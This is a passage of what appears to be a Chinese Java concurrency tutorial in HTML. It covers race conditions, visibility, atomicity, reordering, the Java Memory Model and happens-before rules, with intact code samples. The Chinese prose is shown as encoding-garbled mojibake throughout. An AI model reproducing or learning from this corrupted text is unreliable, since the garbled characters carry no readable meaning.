<li>ä¼˜å…ˆçº§åªæ˜¯æç¤ºï¼Œæ“ä½œç³»ç»Ÿå¯èƒ½å¿½ç•¥</li>
<li>ä¸åŒæ“ä½œç³»ç»Ÿå¯¹ä¼˜å…ˆçº§çš„å¤„ç†ä¸åŒ</li>
<li>ä¸æ¨èä¾èµ–ä¼˜å…ˆçº§æ¥ä¿è¯ç¨‹åºæ­£ç¡®æ€§</li>
</ul>
<hr/>
<h2 data-id="heading-31">ç¬¬äºŒç«  çº¿ç¨‹å®‰å…¨åŸºç¡€</h2>
<h3 data-id="heading-32">2.1 ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨</h3>
<h4 data-id="heading-33">çº¿ç¨‹å®‰å…¨çš„å®šä¹‰</h4>
<p>**çº¿ç¨‹å®‰å…¨ï¼ˆThread Safetyï¼‰**æ˜¯æŒ‡å½“å¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå¯¹è±¡æ—¶ï¼Œä¸éœ€è¦é¢å¤–çš„åŒæ­¥æœºåˆ¶ï¼Œç¨‹åºä»èƒ½æ­£ç¡®æ‰§è¡Œï¼Œå¹¶ä¸”ç»“æœç¬¦åˆé¢„æœŸã€‚</p>
<p><strong>Brian Goetzåœ¨ã€ŠJavaå¹¶å‘ç¼–ç¨‹å®æˆ˜ã€‹ä¸­çš„å®šä¹‰ï¼š</strong></p>
<blockquote>
<p>å½“å¤šä¸ªçº¿ç¨‹è®¿é—®æŸä¸ªç±»æ—¶ï¼Œä¸ç®¡è¿è¡Œæ—¶ç¯å¢ƒé‡‡ç”¨ä½•ç§è°ƒåº¦æ–¹å¼æˆ–è€…è¿™äº›çº¿ç¨‹å°†å¦‚ä½•äº¤æ›¿æ‰§è¡Œï¼Œå¹¶ä¸”åœ¨ä¸»è°ƒä»£ç ä¸­ä¸éœ€è¦ä»»ä½•é¢å¤–çš„åŒæ­¥æˆ–ååŒï¼Œè¿™ä¸ªç±»éƒ½èƒ½è¡¨ç°å‡ºæ­£ç¡®çš„è¡Œä¸ºï¼Œé‚£ä¹ˆå°±ç§°è¿™ä¸ªç±»æ˜¯çº¿ç¨‹å®‰å…¨çš„ã€‚</p>
</blockquote>
<h4 data-id="heading-34">ç«æ€æ¡ä»¶ï¼ˆRace Conditionï¼‰</h4>
<p><strong>ç«æ€æ¡ä»¶</strong>æ˜¯æŒ‡ç¨‹åºçš„æ‰§è¡Œç»“æœä¾èµ–äºçº¿ç¨‹æ‰§è¡Œçš„ç›¸å¯¹æ—¶åºã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RaceCondition</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ä¸æ˜¯åŸå­æ“ä½œ</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getCount</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> count;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">RaceCondition</span> <span class="hljs-variable">rc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RaceCondition</span>();
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">t1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
                rc.increment();
            }
        });
        
        <span class="hljs-type">Thread</span> <span class="hljs-variable">t2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++) {
                rc.increment();
            }
        });
        
        t1.start();
        t2.start();
        t1.join();
        t2.join();
        
        System.out.println(<span class="hljs-string">"æœ€ç»ˆç»“æœ: "</span> + rc.getCount()); 
        <span class="hljs-comment">// æœŸæœ›20000ï¼Œå®é™…å¯èƒ½å°äº20000</span>
    }
}
</code></pre>
<p><strong>åŸå› åˆ†æï¼š</strong>
<code>count++</code>ä¸æ˜¯åŸå­æ“ä½œï¼Œå®é™…åŒ…å«ä¸‰ä¸ªæ­¥éª¤ï¼š</p>
<ol>
<li>è¯»å–countçš„å€¼</li>
<li>å°†countåŠ 1</li>
<li>å°†æ–°å€¼å†™å›count</li>
</ol>
<p>ä¸¤ä¸ªçº¿ç¨‹å¯èƒ½åŒæ—¶è¯»å–åˆ°ç›¸åŒçš„å€¼ï¼Œå¯¼è‡´ç»“æœä¸æ­£ç¡®ã€‚</p>
<h4 data-id="heading-35">æ•°æ®ç«äº‰ï¼ˆData Raceï¼‰</h4>
<p><strong>æ•°æ®ç«äº‰</strong>æ˜¯æŒ‡å¤šä¸ªçº¿ç¨‹åœ¨æ²¡æœ‰åŒæ­¥çš„æƒ…å†µä¸‹ï¼ŒåŒæ—¶è®¿é—®åŒä¸€ä¸ªå…±äº«å˜é‡ï¼Œå¹¶ä¸”è‡³å°‘æœ‰ä¸€ä¸ªçº¿ç¨‹åœ¨å†™ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">DataRace</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-comment">// çº¿ç¨‹1</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        value = <span class="hljs-number">42</span>;
        flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// å¯èƒ½è¢«é‡æ’åº</span>
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {
            System.out.println(value); <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°value=0</span>
        }
    }
}
</code></pre>
<h4 data-id="heading-36">å¯è§æ€§é—®é¢˜</h4>
<p><strong>å¯è§æ€§</strong>æ˜¯æŒ‡ä¸€ä¸ªçº¿ç¨‹å¯¹å…±äº«å˜é‡çš„ä¿®æ”¹ï¼Œèƒ½å¤ŸåŠæ—¶è¢«å…¶ä»–çº¿ç¨‹çœ‹åˆ°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">VisibilityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// æ²¡æœ‰volatileä¿®é¥°</span>
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
            <span class="hljs-keyword">while</span> (running) {
                <span class="hljs-comment">// å¯èƒ½æ°¸è¿œå¾ªç¯ï¼Œå› ä¸ºçœ‹ä¸åˆ°runningçš„å˜åŒ–</span>
            }
            System.out.println(<span class="hljs-string">"çº¿ç¨‹ç»“æŸ"</span>);
        }).start();
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">()</span> {
        running = <span class="hljs-literal">false</span>; <span class="hljs-comment">// ä¿®æ”¹å¯èƒ½å¯¹å…¶ä»–çº¿ç¨‹ä¸å¯è§</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> InterruptedException {
        <span class="hljs-type">VisibilityProblem</span> <span class="hljs-variable">vp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VisibilityProblem</span>();
        vp.start();
        Thread.sleep(<span class="hljs-number">1000</span>);
        vp.stop(); <span class="hljs-comment">// å¯èƒ½æ— æ³•åœæ­¢çº¿ç¨‹</span>
    }
}
</code></pre>
<p><strong>åŸå› ï¼š</strong></p>
<ul>
<li>CPUç¼“å­˜ï¼šæ¯ä¸ªçº¿ç¨‹å¯èƒ½åœ¨è‡ªå·±çš„CPUç¼“å­˜ä¸­ä¿å­˜å˜é‡çš„å‰¯æœ¬</li>
<li>æŒ‡ä»¤é‡æ’åºï¼šç¼–è¯‘å™¨å’ŒCPUå¯èƒ½é‡æ’åºæŒ‡ä»¤</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">running</span> <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>; <span class="hljs-comment">// ä½¿ç”¨volatileä¿è¯å¯è§æ€§</span>
</code></pre>
<h4 data-id="heading-37">åŸå­æ€§é—®é¢˜</h4>
<p><strong>åŸå­æ€§</strong>æ˜¯æŒ‡ä¸€ä¸ªæ“ä½œè¦ä¹ˆå…¨éƒ¨æ‰§è¡Œï¼Œè¦ä¹ˆéƒ½ä¸æ‰§è¡Œï¼Œä¸ä¼šè¢«æ‰“æ–­ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AtomicityProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ä¸æ˜¯åŸå­æ“ä½œ</span>
    }
    
    <span class="hljs-comment">// åŸå­æ“ä½œç¤ºä¾‹</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">incrementSync</span><span class="hljs-params">()</span> {
        count++; <span class="hljs-comment">// ç°åœ¨æ˜¯åŸå­æ“ä½œ</span>
    }
}
</code></pre>
<p><strong>éåŸå­æ“ä½œç¤ºä¾‹ï¼š</strong></p>
<ul>
<li><code>count++</code> - è¯»å–ã€ä¿®æ”¹ã€å†™å…¥ä¸‰æ­¥</li>
<li><code>count = count + 1</code> - åŒä¸Š</li>
<li><code>obj.field = obj.field + 1</code> - åŒä¸Š</li>
</ul>
<p><strong>åŸå­æ“ä½œï¼š</strong></p>
<ul>
<li>åŸºæœ¬ç±»å‹çš„èµ‹å€¼ï¼ˆlongå’Œdoubleåœ¨32ä½JVMä¸Šé™¤å¤–ï¼‰</li>
<li>volatileå˜é‡çš„è¯»å†™</li>
<li>synchronizedå—å†…çš„æ“ä½œ</li>
</ul>
<h4 data-id="heading-38">æœ‰åºæ€§é—®é¢˜</h4>
<p><strong>æœ‰åºæ€§</strong>æ˜¯æŒ‡ç¨‹åºæ‰§è¡Œçš„é¡ºåºæŒ‰ç…§ä»£ç çš„å…ˆåé¡ºåºæ‰§è¡Œã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderingProblem</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    
    <span class="hljs-comment">// çº¿ç¨‹1</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        a = <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
        b = <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
        flag = <span class="hljs-literal">true</span>; <span class="hljs-comment">// 3</span>
    }
    
    <span class="hljs-comment">// çº¿ç¨‹2</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {
            <span class="hljs-type">int</span> <span class="hljs-variable">r1</span> <span class="hljs-operator">=</span> a; <span class="hljs-comment">// å¯èƒ½çœ‹åˆ°a=0ï¼Œb=2ï¼ˆé‡æ’åºï¼‰</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">r2</span> <span class="hljs-operator">=</span> b;
        }
    }
}
</code></pre>
<p><strong>æŒ‡ä»¤é‡æ’åºçš„åŸå› ï¼š</strong></p>
<ul>
<li>ç¼–è¯‘å™¨ä¼˜åŒ–</li>
<li>CPUæŒ‡ä»¤çº§å¹¶è¡Œ</li>
<li>å†…å­˜ç³»ç»Ÿé‡æ’åº</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä½¿ç”¨volatileç¦æ­¢é‡æ’åº</li>
<li>ä½¿ç”¨synchronizedä¿è¯æœ‰åºæ€§</li>
<li>éµå¾ªhappens-beforeè§„åˆ™</li>
</ul>
<h3 data-id="heading-39">2.2 å†…å­˜æ¨¡å‹åŸºç¡€</h3>
<h4 data-id="heading-40">JMMï¼ˆJava Memory Modelï¼‰æ¦‚è¿°</h4>
<p>**Javaå†…å­˜æ¨¡å‹ï¼ˆJMMï¼‰**å®šä¹‰äº†Javaç¨‹åºä¸­å„ç§å˜é‡ï¼ˆå®ä¾‹å˜é‡ã€é™æ€å˜é‡ç­‰ï¼‰çš„è®¿é—®è§„åˆ™ï¼Œä»¥åŠåœ¨JVMä¸­å°†å˜é‡å­˜å‚¨åˆ°å†…å­˜å’Œä»å†…å­˜ä¸­è¯»å–å˜é‡çš„åº•å±‚ç»†èŠ‚ã€‚</p>
<p><strong>JMMçš„ç›®æ ‡ï¼š</strong></p>
<ul>
<li>å±è”½å„ç§ç¡¬ä»¶å’Œæ“ä½œç³»ç»Ÿçš„å†…å­˜è®¿é—®å·®å¼‚</li>
<li>ä¿è¯Javaç¨‹åºåœ¨å„ç§å¹³å°ä¸‹éƒ½èƒ½è¾¾åˆ°ä¸€è‡´çš„å†…å­˜è®¿é—®æ•ˆæœ</li>
<li>ä¸ºå¤šçº¿ç¨‹ç¼–ç¨‹æä¾›å†…å­˜å¯è§æ€§ä¿è¯</li>
</ul>
<h4 data-id="heading-41">ä¸»å†…å­˜ä¸å·¥ä½œå†…å­˜</h4>
<p><strong>ä¸»å†…å­˜ï¼ˆMain Memoryï¼‰ï¼š</strong></p>
<ul>
<li>æ‰€æœ‰å…±äº«å˜é‡éƒ½å­˜å‚¨åœ¨ä¸»å†…å­˜ä¸­</li>
<li>ä¸»å†…å­˜æ˜¯å…±äº«çš„ï¼Œæ‰€æœ‰çº¿ç¨‹éƒ½å¯ä»¥è®¿é—®</li>
</ul>
<p><strong>å·¥ä½œå†…å­˜ï¼ˆWorking Memoryï¼‰ï¼š</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„å·¥ä½œå†…å­˜</li>
<li>å·¥ä½œå†…å­˜ä¿å­˜äº†è¯¥çº¿ç¨‹ä½¿ç”¨åˆ°çš„å˜é‡çš„ä¸»å†…å­˜å‰¯æœ¬</li>
<li>çº¿ç¨‹å¯¹å˜é‡çš„æ‰€æœ‰æ“ä½œéƒ½å¿…é¡»åœ¨å·¥ä½œå†…å­˜ä¸­è¿›è¡Œ</li>
<li>ä¸åŒçº¿ç¨‹ä¹‹é—´æ— æ³•ç›´æ¥è®¿é—®å¯¹æ–¹çš„å·¥ä½œå†…å­˜</li>
</ul>
<p><strong>å†…å­˜äº¤äº’æµç¨‹ï¼š</strong></p>
<pre><code class="hljs language-arduino" lang="arduino">ä¸»å†…å­˜
  â†“ read
å·¥ä½œå†…å­˜ï¼ˆçº¿ç¨‹<span class="hljs-number">1</span>ï¼‰ â†â†’ å·¥ä½œå†…å­˜ï¼ˆçº¿ç¨‹<span class="hljs-number">2</span>ï¼‰
  â†“ assign          â†“ assign
  â†“ write           â†“ write
  â†“ store           â†“ store
ä¸»å†…å­˜
</code></pre>
<p><strong>8ç§å†…å­˜æ“ä½œï¼š</strong></p>
<ol>
<li><code>lock</code>ï¼ˆé”å®šï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠå˜é‡æ ‡è¯†ä¸ºçº¿ç¨‹ç‹¬å </li>
<li><code>unlock</code>ï¼ˆè§£é”ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼Œé‡Šæ”¾é”å®šçŠ¶æ€çš„å˜é‡</li>
<li><code>read</code>ï¼ˆè¯»å–ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠå˜é‡å€¼ä»ä¸»å†…å­˜ä¼ è¾“åˆ°çº¿ç¨‹å·¥ä½œå†…å­˜</li>
<li><code>load</code>ï¼ˆè½½å…¥ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠreadå¾—åˆ°çš„å€¼æ”¾å…¥å·¥ä½œå†…å­˜çš„å˜é‡å‰¯æœ¬</li>
<li><code>use</code>ï¼ˆä½¿ç”¨ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠå·¥ä½œå†…å­˜å˜é‡å€¼ä¼ é€’ç»™æ‰§è¡Œå¼•æ“</li>
<li><code>assign</code>ï¼ˆèµ‹å€¼ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠæ‰§è¡Œå¼•æ“æ¥æ”¶çš„å€¼èµ‹ç»™å·¥ä½œå†…å­˜å˜é‡</li>
<li><code>store</code>ï¼ˆå­˜å‚¨ï¼‰ï¼šä½œç”¨äºå·¥ä½œå†…å­˜ï¼ŒæŠŠå·¥ä½œå†…å­˜å˜é‡å€¼ä¼ é€åˆ°ä¸»å†…å­˜</li>
<li><code>write</code>ï¼ˆå†™å…¥ï¼‰ï¼šä½œç”¨äºä¸»å†…å­˜ï¼ŒæŠŠstoreä¼ é€æ¥çš„å€¼æ”¾å…¥ä¸»å†…å­˜å˜é‡</li>
</ol>
<h4 data-id="heading-42">å†…å­˜å¯è§æ€§</h4>
<p><strong>å†…å­˜å¯è§æ€§</strong>æ˜¯æŒ‡å½“ä¸€ä¸ªçº¿ç¨‹ä¿®æ”¹äº†å…±äº«å˜é‡çš„å€¼ï¼Œå…¶ä»–çº¿ç¨‹èƒ½å¤Ÿç«‹å³çœ‹åˆ°è¿™ä¸ªä¿®æ”¹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MemoryVisibility</span> {
    <span class="hljs-comment">// æ²¡æœ‰volatileï¼Œå¯èƒ½ä¸å¯è§</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writer</span><span class="hljs-params">()</span> {
        count = <span class="hljs-number">1</span>;      <span class="hljs-comment">// æ­¥éª¤1</span>
        flag = <span class="hljs-literal">true</span>;    <span class="hljs-comment">// æ­¥éª¤2</span>
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reader</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (flag) {     <span class="hljs-comment">// æ­¥éª¤3</span>
            <span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> count; <span class="hljs-comment">// æ­¥éª¤4ï¼Œå¯èƒ½è¯»åˆ°0</span>
        }
    }
}
</code></pre>
<p><strong>å¯è§æ€§é—®é¢˜äº§ç”Ÿçš„åŸå› ï¼š</strong></p>
<ol>
<li><strong>CPUç¼“å­˜</strong>ï¼šæ¯ä¸ªCPUæ ¸å¿ƒæœ‰è‡ªå·±çš„ç¼“å­˜ï¼Œå˜é‡å¯èƒ½åªæ›´æ–°åœ¨ç¼“å­˜ä¸­</li>
<li><strong>æŒ‡ä»¤é‡æ’åº</strong>ï¼šç¼–è¯‘å™¨å’ŒCPUå¯èƒ½é‡æ’åºæŒ‡ä»¤</li>
<li><strong>å¯„å­˜å™¨ä¼˜åŒ–</strong>ï¼šå˜é‡å¯èƒ½è¢«ä¼˜åŒ–åˆ°å¯„å­˜å™¨ä¸­</li>
</ol>
<p><strong>ä¿è¯å¯è§æ€§çš„æ–¹æ³•ï¼š</strong></p>
<ul>
<li><code>volatile</code>å…³é”®å­—</li>
<li><code>synchronized</code>å…³é”®å­—</li>
<li><code>final</code>å…³é”®å­—ï¼ˆåˆå§‹åŒ–åå¯è§ï¼‰</li>
<li><code>Lock</code>æ¥å£</li>
</ul>
<h4 data-id="heading-43">happens-beforeè§„åˆ™</h4>
<p><strong>happens-before</strong>æ˜¯JMMçš„æ ¸å¿ƒæ¦‚å¿µï¼Œç”¨äºæè¿°ä¸¤ä¸ªæ“ä½œä¹‹é—´çš„å¯è§æ€§å…³ç³»ã€‚</p>
<p><strong>è§„åˆ™1ï¼šç¨‹åºé¡ºåºè§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;  <span class="hljs-comment">// æ“ä½œ1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;  <span class="hljs-comment">// æ“ä½œ2</span>
<span class="hljs-comment">// æ“ä½œ1 happens-before æ“ä½œ2</span>
</code></pre>
<p><strong>è§„åˆ™2ï¼švolatileè§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;

<span class="hljs-comment">// çº¿ç¨‹1</span>
x = <span class="hljs-number">1</span>; <span class="hljs-comment">// å†™æ“ä½œ</span>

<span class="hljs-comment">// çº¿ç¨‹2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">r</span> <span class="hljs-operator">=</span> x; <span class="hljs-comment">// è¯»æ“ä½œï¼Œèƒ½çœ‹åˆ°x=1</span>
</code></pre>
<p><strong>è§„åˆ™3ï¼šä¼ é€’æ€§è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¦‚æœ A happens-before Bï¼ŒB happens-before C</span>
<span class="hljs-comment">// é‚£ä¹ˆ A happens-before C</span>
</code></pre>
<p><strong>è§„åˆ™4ï¼šç›‘è§†å™¨é”è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">synchronized</span> (lock) {
    <span class="hljs-comment">// è§£é” happens-before åç»­çš„åŠ é”</span>
}
</code></pre>
<p><strong>è§„åˆ™5ï¼šstart()è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ“ä½œ</span>
});
t.start(); <span class="hljs-comment">// start() happens-before çº¿ç¨‹tä¸­çš„ä»»ä½•æ“ä½œ</span>
</code></pre>
<p><strong>è§„åˆ™6ï¼šjoin()è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Thread</span> <span class="hljs-variable">t</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Thread</span>(() -&gt; {
    <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ“ä½œ</span>
});
t.start();
t.join(); <span class="hljs-comment">// çº¿ç¨‹tä¸­çš„æ‰€æœ‰æ“ä½œ happens-before join()è¿”å›</span>
</code></pre>
<p><strong>è§„åˆ™7ï¼šçº¿ç¨‹ä¸­æ–­è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java">thread.interrupt(); <span class="hljs-comment">// happens-before æ£€æµ‹åˆ°ä¸­æ–­</span>
</code></pre>
<p><strong>è§„åˆ™8ï¼šå¯¹è±¡ç»ˆç»“è§„åˆ™</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¯¹è±¡çš„æ„é€ å‡½æ•° happens-before finalize()æ–¹æ³•</span>
</code></pre>
<h4 data-id="heading-44">as-if-serialè¯­ä¹‰</h4>
<p><strong>as-if-serialè¯­ä¹‰</strong>æ˜¯æŒ‡ï¼šä¸ç®¡æ€ä¹ˆé‡æ’åºï¼Œå•çº¿ç¨‹ç¨‹åºçš„æ‰§è¡Œç»“æœä¸èƒ½è¢«æ”¹å˜ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">// 1</span>
<span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;      <span class="hljs-comment">// 2</span>
<span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;  <span class="hljs-comment">// 3ï¼Œä¾èµ–aå’Œb</span>

<span class="hljs-comment">// å¯ä»¥é‡æ’åº1å’Œ2ï¼Œä½†ä¸èƒ½é‡æ’åº3åˆ°1æˆ–2ä¹‹å‰</span>
</code></pre>
<p><strong>å•çº¿ç¨‹ vs å¤šçº¿ç¨‹ï¼š</strong></p>
<ul>
<li><strong>å•çº¿ç¨‹</strong>ï¼šas-if-serialä¿è¯ç»“æœæ­£ç¡®</li>
<li><strong>å¤šçº¿ç¨‹</strong>ï¼šéœ€è¦happens-beforeä¿è¯å¯è§æ€§</li>
</ul>
<h3 data-id="heading-45">2.3 çº¿ç¨‹å®‰å…¨çš„å®ç°æ–¹å¼</h3>
<h4 data-id="heading-46">ä¸å¯å˜å¯¹è±¡</h4>
<p>**ä¸å¯å˜å¯¹è±¡ï¼ˆImmutable Objectï¼‰**æ˜¯æŒ‡å¯¹è±¡åˆ›å»ºåçŠ¶æ€ä¸èƒ½è¢«ä¿®æ”¹ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ä¸å¯å˜ç±»ç¤ºä¾‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ImmutablePoint</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> x;
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> y;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ImmutablePoint</span><span class="hljs-params">(<span class="hljs-type">int</span> x, <span class="hljs-type">int</span> y)</span> {
        <span class="hljs-built_in">this</span>.x = x;
        <span class="hljs-built_in">this</span>.y = y;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getX</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> x;
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getY</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> y;
    }
    
    <span class="hljs-comment">// æ²¡æœ‰setteræ–¹æ³•ï¼ŒçŠ¶æ€ä¸å¯å˜</span>
}
</code></pre>
<p><strong>å®ç°ä¸å¯å˜å¯¹è±¡çš„åŸåˆ™ï¼š</strong></p>
<ol>
<li>æ‰€æœ‰å­—æ®µéƒ½æ˜¯<code>final</code>çš„</li>
<li>ç±»å£°æ˜ä¸º<code>final</code>ï¼Œé˜²æ­¢è¢«ç»§æ‰¿</li>
<li>ä¸æä¾›ä¿®æ”¹çŠ¶æ€çš„æ–¹æ³•</li>
